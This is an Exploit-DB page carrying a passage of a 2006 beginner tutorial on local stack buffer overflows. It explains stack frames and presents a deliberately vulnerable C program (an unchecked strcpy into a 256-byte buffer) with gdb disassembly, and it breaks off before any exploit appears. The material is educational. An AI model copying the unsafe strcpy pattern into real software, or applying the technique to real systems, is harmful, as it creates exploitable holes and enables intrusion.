@@ -1,0 +1,5377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script src="/js/core/jquery.min.js"></script>
+    <meta charset="utf-8"/>
+    <meta name="csrf-token" content="y6BG3mXxPMURlTZv2p0zQ7yqmv1FPfazok51p09e">
+
+    <link rel="manifest" href="/manifest.json">
+
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+
+    
+    <title>Local Stack Overflow (Basic Module)</title>
+
+    <!-- Prism code colouring -->
+    <link rel="stylesheet" href="/css/prism.css">
+
+    <!-- prism.js syntax highlighter -->
+    <script src="/js/clipboard.js"></script>
+    <script src="/js/prism.js"></script>
+
+    <link rel="canonical" href="https://www.exploit-db.com/papers/13238">
+    <meta name="description" content="Local Stack Overflow (Basic Module)">
+    <meta name="keywords" content="Multiple,papers">
+    <meta name="author" content="Gotfault Security">
+
+    <meta property="og:title" content="Local Stack Overflow (Basic Module)">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://www.exploit-db.com/exploits/13238">
+    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
+    <meta property="og:site_name" content="Exploit Database" />
+    <meta property="article:published_time" content="2006-03-09" />
+        <meta property="article:author" content="Gotfault Security" />
+    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=526" />
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@ExploitDB">
+    <meta name="twitter:title" content="Local Stack Overflow (Basic Module)">
+    <meta name="twitter:creator" content="@ExploitDB">
+    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">
+
+
+    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">
+
+    <meta
+            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
+            name='viewport'/>
+
+    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.exploit-db.com/">
+
+    <meta name="theme-color" content="#ec5e10">
+
+    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
+            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
+            type="text/javascript">
+    </script>
+
+    <script type="text/javascript">
+        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );
+
+        ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"
+            type="text/javascript">
+
+    </script>
+
+    <!-- Material Design Icons https://materialdesignicons.com/ -->
+    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>
+
+    <!-- Theme CSS Files -->
+    <link href="/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>
+
+    <link href="/css/app.css" rel="stylesheet"/>
+
+    <style>
+        .rbtn {
+            border: 2px solid white;
+            border-radius: 20px;
+            color: black;
+            padding: 8px;
+            cursor: pointer;
+        }
+
+        .rsuccess {
+            border-color: white;
+            color: white;
+        }
+
+        .rsuccess:hover {
+            background-color: white;
+            color: #165283;
+        }
+        .rprimary {
+            border-color: #ca4f0c;
+            color: #ca4f0c;
+        }
+
+        .rprimary:hover {
+            background-color: #ca4f0c;
+            color: white;
+        }
+    </style>
+</head>
+
+<body class=" sidebar-mini">
+
+<div class="wrapper">
+
+    
+    <div class="sidebar" data-color="orange">
+
+    <div class="logo">
+
+        
+        <a href="/" class="simple-text logo-mini">
+            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
+        </a>
+
+        
+        
+            <a href="/" class="simple-text logo-normal">
+                Exploit Database
+            </a>
+
+        
+    </div>
+
+    <div class="sidebar-wrapper">
+
+        <ul class="nav">
+
+            
+            <li class="">
+
+                <a href="/">
+                    <i class="mdi mdi-ladybug mdi-24px"></i>
+                    <p>Exploits</p>
+                </a>
+
+            </li>
+
+            
+            <li class="">
+
+                <a href="/google-hacking-database">
+                    <i class="mdi mdi-search-web mdi-24px"></i>
+                    <p title="Google Hacking Database">GHDB</p>
+                </a>
+
+            </li>
+
+            
+            <li class="active">
+
+                <a href="/papers">
+                    <i class="mdi mdi-file-outline mdi-24px"></i>
+                    <p>Papers</p>
+                </a>
+
+            </li>
+
+            
+            <li class="">
+
+                <a href="/shellcodes">
+                    <i class="mdi mdi-chip mdi-24px"></i>
+                    <p>Shellcodes</p>
+                </a>
+
+            </li>
+
+        </ul>
+
+        <hr/>
+
+        <ul class="nav">
+
+
+
+                <li>
+
+                    <a class="nav-link" href="/search">
+                        <i class="mdi mdi-database-search mdi-24px"></i>
+                        <p title="Search Exploit-Database">Search EDB</p>
+                    </a>
+
+                </li>
+
+
+
+            <li>
+
+                
+                <a class="nav-link" href="/searchsploit">
+                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
+                    <p>SearchSploit Manual</p>
+                </a>
+
+            </li>
+
+            <li>
+
+                
+                <a class="nav-link" href="/submit">
+                    <i class="mdi mdi-upload mdi-24px"></i>
+                    <p>Submissions</p>
+                </a>
+
+            </li>
+
+        </ul>
+
+        <hr/>
+
+        <ul class="nav">
+
+            <li>
+
+                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
+                    <i class="mdi mdi-school mdi-24px"></i>
+                    <p>Online Training <b class="caret"></b></p>
+                </a>
+
+                <div class="collapse " id="onlineTraining">
+                    <ul class="nav">
+
+                        <li>
+                            <a href="/pentest-training-with-kali-linux">
+                                <span class="sidebar-mini-icon">PWK</span>
+                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="/wireless-attacks-training">
+                                <span class="sidebar-mini-icon">WiFu</span>
+                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="/evasion-techniques-breaching-defenses">
+                                <span class="sidebar-mini-icon">ETBD</span>
+                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="/advanced-web-attacks">
+                                <span class="sidebar-mini-icon">AWAE</span>
+                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="/windows-user-mode-exploit-development">
+                                <span class="sidebar-mini-icon">WUMED</span>
+                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
+                            </a>
+                        </li>
+                    </ul>
+
+                </div>
+
+            </li>
+
+<!--
+            <li>
+
+                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
+                    <i class="mdi mdi-link-variant mdi-24px"></i>
+                    <p>Offsec Resources</p>
+                </a>
+
+            </li>
+-->
+        </ul>
+
+    </div>
+
+</div>
+
+    <div class="main-panel">
+
+        
+        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
+  bg-primary">
+
+    <div class="container-fluid">
+
+        <div class="navbar-wrapper">
+
+            <div class="navbar-toggle">
+                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
+                    <span class="navbar-toggler-bar bar1"></span>
+                    <span class="navbar-toggler-bar bar2"></span>
+                    <span class="navbar-toggler-bar bar3"></span>
+                </button>
+            </div>
+
+            
+            <a class="navbar-brand" href="/">
+                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
+            </a>
+
+        </div>
+
+        
+        <div class="collapse navbar-collapse justify-content-end" id="navigation">
+
+            <ul class="navbar-nav">
+
+                
+                    
+
+                        
+                           
+                           
+
+                            
+                            
+                                
+                            
+                        
+
+                        
+
+                            
+                                
+                            
+
+                            
+                               
+                                                     
+                                
+                            
+
+                            
+                                
+                            
+
+                        
+                    
+                
+
+                
+                    
+
+                        
+                            
+                            
+                                
+                            
+                        
+
+                    
+                
+
+                <li class="nav-item">
+
+                    
+                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
+                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
+                        <p>
+                            <span class="d-lg-none d-md-block">Stats</span>
+                        </p>
+                    </a>
+
+                </li>
+
+                <li class="nav-item dropdown">
+
+                    
+                    <a class="nav-link dropdown-toggle" href="/"
+                       id="navbarDropdownMenuLink" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">
+
+                        <i class="mdi mdi-information-outline mdi-24px"></i>
+                        <p>
+                            <span class="d-lg-none d-md-block">About Us</span>
+                        </p>
+                    </a>
+
+                    <div class="dropdown-menu dropdown-menu-right"
+                         aria-labelledby="navbarDropdownMenuLink">
+
+                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
+                            About Exploit-DB
+                        </a>
+
+                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
+                            Exploit-DB History
+                        </a>
+
+                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
+                            FAQ
+                        </a>
+
+                    </div>
+
+                </li>
+
+                
+                                    <li class="nav-item">
+
+                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
+                            <i class="mdi mdi-database-search mdi-24px"></i>
+                            <p>
+                                <span class="d-lg-none d-md-block">Search</span>
+                            </p>
+                        </a>
+
+                    </li>
+
+                
+            </ul>
+
+        </div>
+
+    </div>
+
+</nav>
+
+        
+        
+    <div class="panel-header panel-header-sm"></div>
+
+    <div class="content">
+
+        <div class="row">
+
+            <div class="col-md-12">
+
+                
+                <div class="card">
+
+                    <div class="card-body">
+
+                        <div class="row justify-content-md-center">
+
+                            
+                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
+                                Local Stack Overflow (Basic Module)
+                            </h1>
+
+                        </div>
+
+                        
+                        <div class="ml-2 mr-2">
+
+                            <div class="row">
+
+                                <div class="col-sm-12 col-md-4">
+
+                                    <div class="card card-stats">
+
+                                        <div class="card-body ">
+
+                                            <div class="statistics statistics-horizontal">
+
+                                                <div class="info info-horizontal">
+
+                                                    <div class="row">
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                EDB-ID:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+                                                                13238
+                                                            </h6>
+
+                                                        </div>
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                CVE:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+
+                                                                                                                                        N/A
+
+                                                                
+                                                            </h6>
+
+                                                        </div>
+
+                                                    </div>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+                                        <hr>
+
+                                        <div class="card-footer ">
+
+                                            <div class="stats h6 text-center">
+
+                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
+                                                <strong>EDB Verified:</strong>
+                                                <i class="mdi mdi-24px mdi-check"
+                                                   style="color: #96b365">
+                                                </i>
+
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <div class="col-sm-12 col-md-4">
+
+                                    <div class="card card-stats">
+
+                                        <div class="card-body ">
+
+                                            <div class="statistics statistics-horizontal">
+
+                                                <div class="info info-horizontal">
+
+                                                    <div class="row">
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                Author:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+
+                                                                <a href="/?author=526">
+                                                                    Gotfault Security
+                                                                </a>
+
+                                                            </h6>
+
+                                                        </div>
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                Type:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+
+                                                                <a href="/?type=papers">
+                                                                    papers
+                                                                </a>
+
+                                                            </h6>
+
+                                                        </div>
+
+                                                    </div>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+                                        <hr/>
+
+                                        <div class="card-footer">
+
+                                            <div class="stats h6 text-center">
+
+                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
+                                                <strong>Paper: </strong>
+                                                <a href="/download/13238" data-toggle="tooltip" data-placement="top"
+                                                   title="Download" aria-label="Download Paper 13238">
+                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
+                                                </a>
+                                                &nbsp; / &nbsp;
+                                                <a href="/raw/13238" data-toggle="tooltip" data-placement="top"
+                                                   title="View Raw" aria-label="View Raw 13238">
+                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
+                                                </a>
+
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                                <div class="col-sm-12 col-md-4">
+
+                                    <div class="card card-stats">
+
+                                        <div class="card-body ">
+
+                                            <div class="statistics statistics-horizontal">
+
+                                                <div class="info info-horizontal">
+
+                                                    <div class="row">
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                Platform:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+
+                                                                <a href="/?platform=multiple">
+                                                                    Multiple
+                                                                </a>
+
+                                                            </h6>
+
+                                                        </div>
+
+                                                        <div class="col-6 text-center">
+
+                                                            <h3 class="info-title">
+                                                                Published:
+                                                            </h3>
+
+                                                            <h6 class="stats-title">
+                                                                2006-03-09
+                                                            </h6>
+
+                                                        </div>
+
+                                                    </div>
+
+                                                </div>
+
+                                            </div>
+
+                                        </div>
+
+                                        <hr/>
+
+                                        <div class="card-footer ">
+
+                                            <div class="stats h6 text-center">
+
+                                                
+                                                <strong>Vulnerable App:</strong>
+
+                                                
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+                            <div class="row">
+
+                                <div class="btn-group ml-3">
+
+                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
+                                       href="/papers/13237" aria-label="View Previous Paper"
+                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
+                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
+                                    </a>
+
+                                </div>
+
+
+                                <div class="col">
+
+                                    <div class="btn-group float-right">
+
+                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
+                                           href="/papers/13239" aria-label="View Next Paper"
+                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
+                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
+                                        </a>
+
+                                    </div>
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                
+                <div class="card">
+
+                    <div class="card-body">
+
+                        
+                        <pre><code class="language-txt" style="white-space: pre-wrap;">                        Gotfault Security Community
+                                  (GSC)
+ 
+
+---------[ Chapter : 0x100                                ]
+---------[ Subject : Introduction to Local Stack Overflow ]
+---------[ Author  : xgc/dx A.K.A Thyago Silva            ]
+---------[ Date    : 08/27/2005                           ]
+---------[ Version : 2.5                                  ]
+ 
+ 
+|=-----------------------------------------------------------------------------=|
+ 
+---------[ Table of Contents ]
+ 
+  0x110 - Objective
+  0x120 - Requisites
+  0x130 - Introduction to Gotfault Sharing Knowledge (GSK)
+  0x140 - Introduction to Buffer Overflow
+  0x150 - Memory Sections
+  0x160 - Function Calls Process (FCP)
+  0x170 - Main Registers of the Stack
+  0x180 - Introduction to the Stack Frame
+  0x190 - Analysis of Vulnerable Source Code
+  0x1a0 - Getting Start: Overflowing/Controlling/Executing
+  0x1b0 - Conclusion
+ 
+|=-----------------------------------------------------------------------------=|
+ 
+ 
+---------[ 0x110 - Objective ]
+ 
+Get basic knowledge of memory analysis and be able to control his flow to execute
+arbitrary code.
+ 
+ 
+---------[ 0x120 - Requisites ]
+ 
+Basic knowledge of C/PERL programming.
+ 
+ 
+---------[ 0x130 - Introduction to Gotfault Sharing Knowledge (GSK) ]
+ 
+GSK was created to interested users on programming security to discuss 
+about exploitation techniques under stuff of the selected subject.
+The main goal consists on users to share knowledge with each one.
+I&#039;ll try to pass detailed informations of the selected subject, giving
+the chance to users that are just starting. All kind of users are welcome.
+
+ 
+---------[ 0x140 - Introduction to Buffer Overflow ]
+ 
+The principle of exploiting a buffer overflow is to overwrite parts of
+memory which aren&#039;t supposed to be overwritten by arbitrary input and
+making the process execute this code. To see how and where an overflow
+takes place, lets take a look at how memory is organized.
+ 
+ 
+---------[ 0x150 - Memory Sections ]
+ 
+The processes memory consists of three sections:
+ 
+ - Code segment:  Data, in this segment, are assembler instructions that
+                  the processor executes. The code execution is non-linear,
+                  it can skip code, jump, and call functions on certain
+                  conditions. Therefore, we have a pointer called EIP, or
+                  instruction pointer. The address where EIP points to 
+                  always contains the code that will be executed next.
+ 
+ - Data segment:  Space for variables and static/dynamic buffers.
+ 
+ - Stack segment: Which is used to pass data(arguments) to functions
+                  and as a space for variables of functions. The bottom(start)
+                  of the stack usually resides at the very end of the virtual
+                  memory of a page, and grows down. The assembler command PUSHL
+                  will add to the top of the stack, and POPL will remove one item
+                  from the top of the stack and put it in a register.
+ 
+Process Memory Layout:
+ 
+ 
+0xc0000000 ---------------------
+           |                   |
+           | env/argv pointer. |
+           |       argc        |
+           |-------------------|
+           |                   |
+           |      stack        |
+           |                   |
+           |        |          |
+           |        |          |
+           |        V          |
+           /                   /
+           \                   \
+           |                   |
+           |        ^          |
+           |        |          |
+           |        |          |
+           |                   |
+           |       heap        |
+           |-------------------|
+           |        bss        |
+           |-------------------|
+           | initialized data  |
+           |-------------------|
+           |       text        |
+           |-------------------|
+           | shared libraries  |
+           |        etc.       |
+0x8000000  |-------------------|
+ 
+ 
+---------[ 0x160 - Function Calls Process (FCP) ]
+ 
+On a Unix system, a function call may be broken up in three steps:
+ 
+ - Prolog   : The current frame pointer(EBP register) is saved. A frame can be viewed
+              as a logical unit of the stack, and contains all the elements
+              related to a function. The amount of memory which is necessary
+              for the function is reserved.
+ 
+ - Call     : The function parameters are stored in the stack and the instruction 
+              pointer(EIP register) is saved, in order to know which instruction must be 
+              considered when the function returns.
+ 
+ - Epilog   : The old stack state is restored(Return).
+ 
+ 
+---------[ 0x170 - Main Registers of the Stack ]
+ 
+The following registers are important in operation of the stack:
+ 
+ EIP - The extended instruction pointer. When you call a function, this
+       pointer is saved on the stack for later use. When the function returns,
+       this saved address is used to determine the location of the next executed
+       instruction.
+ 
+ ESP - The extended stack pointer. This points to the current position
+       on the stack and allows things to be added to and removed from the
+       stack using push and pop operations or direct stack pointer manipulations.
+ 
+ EBP - The extended base pointer. This register usually stays the same
+       throughout the execution of a function. It serves as a static point for
+       referencing stack-based information such as variables and data in a
+       function using offsets. This pointer usually points to the top of the stack
+       for a function.
+ 
+ 
+---------[ 0x180 - Introduction to the Stack Frame ]
+ 
+A stack frame is the name given the entire stack section used by a given function,
+including all the passed arguments, the saved EIP and potentially any other saved
+registers as EBP, and the local function variables. Previously we focused on the
+stack.s use in holding local variables; now we will go into the *bigger picture*
+of the stack.
+ 
+To understand how the stack works in the real, we need some understanding
+of the Intel CALL and RET instructions.
+ 
+The CALL instruction makes functions possible. The purpose of this instruction 
+is to divert processor control to a different part of code while remembering 
+where you need to return. To get this goal, a CALL instruction operates like this:
+ 
+ -  Push address of the next instruction after the call onto the stack. (This
+    is where the processor will return to after executing the function)
+ -  Jump to the address specified by the call.
+ 
+The RET instruction does the opposite. Its purpose is to return from a
+called function to whatever was right after the CALL instruction. The RET
+instruction operates like this:
+ 
+ - Pop the stored return address off the stack.
+ - Jump to the address popped off the stack.
+ 
+This combination allows code to be jumped to and returned from very
+easily, without restricting the nesting of function calls too much.
+ 
+ 
+---------[ 0x190 - Analysis of Vulnerable Source Code ]
+ 
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+int bof(char *string) {
+ 
+  char buffer[256];
+ 
+  strcpy(buffer, string);
+ 
+  return 1;
+}
+ 
+int main(int argc, char *argv[]) {
+ 
+  bof(argv[1]);
+  printf(&quot;Not gonna do it!\n&quot;);
+ 
+  return 1;
+}
+ 
+We&#039;ll now check this source code following all flow of memory to demostrate
+what happen with registers and stack area. After all we&#039;ll be able to exploit 
+and execute any code.
+ 
+Let&#039;s see instructions inside main function with gdb.
+
+[xgc@trapdown:~]$ gcc --version
+gcc (GCC) 3.3.5 (Debian 1:3.3.5-13)
+Copyright (C) 2003 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ 
+[xgc@trapdown:~]$ gcc -o simple_stack simple_stack.c
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 &lt;main+0&gt;:    push   %ebp
+0x080483ea &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483ec &lt;main+3&gt;:    sub    $0x8,%esp
+0x080483ef &lt;main+6&gt;:    and    $0xfffffff0,%esp
+0x080483f2 &lt;main+9&gt;:    mov    $0x0,%eax
+0x080483f7 &lt;main+14&gt;:   sub    %eax,%esp
+0x080483f9 &lt;main+16&gt;:   mov    0xc(%ebp),%eax
+0x080483fc &lt;main+19&gt;:   add    $0x4,%eax
+0x080483ff &lt;main+22&gt;:   mov    (%eax),%eax
+0x08048401 &lt;main+24&gt;:   mov    %eax,(%esp)
+0x08048404 &lt;main+27&gt;:   call   0x80483c4 &lt;bof&gt;
+0x08048409 &lt;main+32&gt;:   movl   $0x8048534,(%esp)
+0x08048410 &lt;main+39&gt;:   call   0x80482d8 &lt;_init+56&gt;
+0x08048415 &lt;main+44&gt;:   mov    $0x1,%eax
+0x0804841a &lt;main+49&gt;:   leave
+0x0804841b &lt;main+50&gt;:   ret
+0x0804841c &lt;main+51&gt;:   nop
+0x0804841d &lt;main+52&gt;:   nop
+0x0804841e &lt;main+53&gt;:   nop
+0x0804841f &lt;main+54&gt;:   nop
+End of assembler dump.
+(gdb)
+ 
+I&#039;ll explain now what happen with each line.
+ 
+0x080483e9 &lt;main+0&gt;:    push   %ebp
+0x080483ea &lt;main+1&gt;:    mov    %esp,%ebp
+0x080483ec &lt;main+3&gt;:    sub    $0x8,%esp
+ 
+It&#039;s a PROLOG.
+First, EIP is saved from the function _init (or _start), that initialize 
+this program, which called main().
+Old frame pointer is saved(%ebp) and does, from current stack pointer(esp),
+the new frame pointer(mov %esp, %ebp).
+After gcc-2.9.6 dummy bytes is always set free at functions, in this case 
+0x08 bytes.
+It&#039;s the default process that any function does. 
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+ 
+0x080483f9 &lt;main+16&gt;:   mov    0xc(%ebp),%eax
+0x080483fc &lt;main+19&gt;:   add    $0x4,%eax
+0x080483ff &lt;main+22&gt;:   mov    (%eax),%eax
+0x08048401 &lt;main+24&gt;:   mov    %eax,(%esp)
+0x08048404 &lt;main+27&gt;:   call   0x80483c4 &lt;bof&gt;
+ 
+At line main+16, 0xc(%ebp) is moved to EAX register.
+This address is vector from argv.
+At line main+19, is argv[1] set at EAX register.
+At line main+22, argv[1] as pointer, it gets what argv[1] is pointing to.
+At line main+24, all content of argv[1] is being moved to stack pointer(%esp).
+At line main+27, bof function call is done. Its parameters are piled 
+(in reverse order) and the function is invoked.
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+      | bof(argv[1])      |
+      |-------------------| 
+ 
+0x08048409 &lt;main+32&gt;:   movl   $0x8048534,(%esp)
+0x08048410 &lt;main+39&gt;:   call   0x80482d8 &lt;_init+56&gt;
+0x08048415 &lt;main+44&gt;:   mov    $0x1,%eax
+ 
+Well, at line main+32, address(0x8048534) of string &quot;Not gonna do it!\n&quot; is 
+moved to stack pointer(%esp) and then printf(), at line main+39, is called 
+with his argument passed. The instruction mov $0x1, %eax is for return 1.
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+      | bof(argv[1])      |
+      |-------------------| 
+      | printf()          |
+      |-------------------| 
+      | return 1;         |
+      |-------------------| 
+ 
+0x0804841a &lt;main+49&gt;:   leave
+0x0804841b &lt;main+50&gt;:   ret
+
+It&#039;s a Epilog.
+At line main+49, is the leave instruction that does:
+ 
+mov %ebp, %esp &lt;- restores EBP(old frame from _start function).
+pop %ebp       &lt;- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at main). 
+ 
+At line main+50, RET instruction gets what %esp is pointing to and loads, at EIP
+register, this pointed address, so, this address will be executed.
+ 
+Process Layout at this moment looks like:
+                        
+      |--------------------| --------------------------------+
+      | saved EIP          | - from caller(_start) of main() |
+      |--------------------|                                 |
+      | saved EBP          | - from caller(_start) of main() |
+      |--------------------|                                 |
+      | 0x08 dummy         |   NEW STACK FRAME               |
+      |--------------------| --------------------------------+
+      | bof(argv[1])       |
+      |--------------------| 
+      | printf()           |
+      |--------------------| 
+      | return 1;          |
+      |--------------------| 
+      | mov %ebp, %esp     | ---+
+      |--------------------|    | - leave instruction
+      | pop %ebp           | ---+
+      |--------------------|  
+      | ret gets (%esp)    | ---+
+      |--------------------|    | - ret instruction
+      | loads (%esp) @ EIP | ---+
+      |--------------------|
+ 
+Now, let&#039;s see instructions inside bof function with GDB.
+ 
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 &lt;bof+0&gt;:     push   %ebp
+0x080483c5 &lt;bof+1&gt;:     mov    %esp,%ebp
+0x080483c7 &lt;bof+3&gt;:     sub    $0x118,%esp
+0x080483cd &lt;bof+9&gt;:     mov    0x8(%ebp),%eax
+0x080483d0 &lt;bof+12&gt;:    mov    %eax,0x4(%esp)
+0x080483d4 &lt;bof+16&gt;:    lea    0xfffffef8(%ebp),%eax
+0x080483da &lt;bof+22&gt;:    mov    %eax,(%esp)
+0x080483dd &lt;bof+25&gt;:    call   0x80482e8 &lt;_init+72&gt;
+0x080483e2 &lt;bof+30&gt;:    mov    $0x1,%eax
+0x080483e7 &lt;bof+35&gt;:    leave
+0x080483e8 &lt;bof+36&gt;:    ret
+End of assembler dump.
+(gdb)
+ 
+0x080483c4 &lt;bof+0&gt;:     push   %ebp
+0x080483c5 &lt;bof+1&gt;:     mov    %esp,%ebp
+0x080483c7 &lt;bof+3&gt;:     sub    $0x118,%esp
+ 
+It&#039;s a Prolog. 
+Again, first, EIP is saved from the main function, that call bof function.
+Old frame pointer is saved(%ebp) and does, from current stack pointer(ESP),
+the new frame pointer(mov %esp, %ebp).
+0x118 bytes are available for local variable buffer.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----&gt; |-------------------| --------------------------------+
+     |      | char *string      |  bof()                          |
+     |      |                   |                                 |
+     |      |-------------------|                                 |
+     |      | saved EIP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | saved EBP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | 0x118b @ buffer[] |   NEW STACK FRAME               |
+     |      |-------------------| --------------------------------+
+     |      |                   |
+     |      |-------------------|
+     |      | .text             |
+     |      |-------------------|
+     +----  | call bof() @ main |
+0x08040000  |-------------------|
+            |                   |
+            |-------------------|
+            | shared libraries  |
+0x08000000  |-------------------|
+ 
+ 
+0x080483cd &lt;bof+9&gt;:     mov    0x8(%ebp),%eax
+0x080483d0 &lt;bof+12&gt;:    mov    %eax,0x4(%esp)
+0x080483d4 &lt;bof+16&gt;:    lea    0xfffffef8(%ebp),%eax
+0x080483da &lt;bof+22&gt;:    mov    %eax,(%esp)
+0x080483dd &lt;bof+25&gt;:    call   0x80482e8 &lt;_init+72&gt;
+ 
+Function strcpy requires two arguments, the first one is buffer to alocate the second
+argument, in this case argv[1]. So, at line bof+9 0x8(%ebp)(argv[1]) is moved to EAX
+and at line bof+12, EAX is moved to 0x4(%esp). After, LEA instruction is activated.
+LEA does: loads the efective address from 0xfffffef8(%ebp) to EAX. The difference
+of LEA to MOV is that LEA loads address from somewhere to some register and MOV copies
+the content of address from somewhere to some register.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----&gt; |-------------------| --------------------------------+
+     |      | char *string      |  bof()                          |
+     |      |                   |                                 |
+     |      |-------------------|                                 |
+     |      | saved EIP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | saved EBP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | 0x118b @ buffer[] |   NEW STACK FRAME               |
+     |      |-------------------| --------------------------------+
+     |      | strcpy()          |
+     |      |-------------------|
+     |      |                   |
+     |      |-------------------|
+     |      | .text             |
+     |      |-------------------|
+     +----  | call bof() @ main |
+0x08040000  |-------------------|
+            |                   |
+            |-------------------|
+            | shared libraries  |
+0x08000000  |-------------------|
+ 
+0x080483e7 &lt;bof+35&gt;:    leave
+0x080483e8 &lt;bof+36&gt;:    ret
+ 
+It&#039;s a Epilog.
+Again, at line bof+35, is the LEAVE instruction that does:
+ 
